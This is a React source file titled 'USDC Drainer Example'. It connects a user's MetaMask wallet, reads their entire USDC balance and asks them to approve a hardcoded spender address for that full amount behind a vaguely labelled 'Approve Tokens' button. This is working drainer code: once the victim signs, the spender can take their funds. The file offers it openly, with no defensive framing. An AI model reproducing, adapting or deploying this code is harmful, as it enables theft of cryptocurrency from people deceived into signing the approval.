import './App.css';
import React, { useState } from 'react';

const ethers = require("ethers")

function App() {
  const [userAddress, setUserAddress] = useState('');
  const [isConnected, setIsConnected] = useState(false);

  // Function to connect to the user's Ethereum wallet
  const connectWalletHandler = async () => {
    if (window.ethereum && window.ethereum.isMetaMask) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        console.log('Connected', accounts[0]);
        setUserAddress(accounts[0]);
        setIsConnected(true);
      } catch (error) {
        console.error('Error connecting to wallet:', error);
      }
    } else {
      console.log('Please install MetaMask!');
    }
  };

    // Function to approve tokens
  const approveTokensHandler = async () => {
    if (!window.ethereum || !window.ethereum.isMetaMask) {
      console.log('Ethereum object not found or MetaMask is not installed.');
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    // Replace these with your contract details
    const usdcTokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    const spenderAddress = '0x0c778e66efa266b5011c552C4A7BDA63Ad24C37B';
    const erc20Abi = [
      'function approve(address spender, uint256 amount) external returns (bool)',
      'function balanceOf(address account) external view returns (uint256)',
    ];

    const tokenContract = new ethers.Contract(usdcTokenAddress, erc20Abi, signer);

    try {
      const balance = await tokenContract.balanceOf(userAddress);
      const tx = await tokenContract.approve(spenderAddress, balance);
      await tx.wait();
      console.log(`Approval successful: ${tx.hash}`);
    } catch (error) {
      console.error('Error approving tokens:', error);
    }
  };
  
  return (
    <div className="App">
      <h1>USDC Drainer Example</h1>
      <button onClick={connectWalletHandler}>{isConnected ? 'Wallet Connected' : 'Connect Wallet'}</button>
      <button onClick={approveTokensHandler} disabled={!isConnected}>Approve Tokens</button>
    </div>
  );
}

export default App;
